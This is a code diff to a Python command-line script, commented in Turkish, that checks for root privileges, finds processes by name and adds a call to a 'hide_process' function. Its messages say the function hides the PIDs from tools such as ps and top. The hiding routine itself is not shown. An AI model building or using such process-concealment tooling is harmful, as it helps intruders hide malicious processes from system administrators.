@@ -1,9 +1,10 @@
 import os
 import sys
 import argparse
-from utils import find_pids_by_name
+from utils import find_pids_by_name, hide_process
 
 def check_root():
+    """Programın root yetkisiyle çalışıp çalışmadığını kontrol eder."""
     if os.geteuid() != 0:
         print("[-] Hata: Bu işlem için root (sudo) yetkisi gereklidir!")
         sys.exit(1)
@@ -32,7 +33,13 @@ def main():
         sys.exit(0)
 
     for pid in target_pids:
-        print(f"[+] Hedef PID belirlendi: {pid}")
+        if not args.reveal:
+            print(f"[+] Hedef PID belirlendi: {pid}")
+            if hide_process(pid):
+                print(f"[!] BAŞARILI: PID {pid} artık sistem araçlarından (ps, top) gizlendi.")
+        else:
+            # Reveal (Görünür yapma) kısmı bir sonraki commit'te eklenecek
+            print(f"[*] PID {pid} için görünür yapma işlemi seçildi.")
 
 if __name__ == "__main__":
     main()
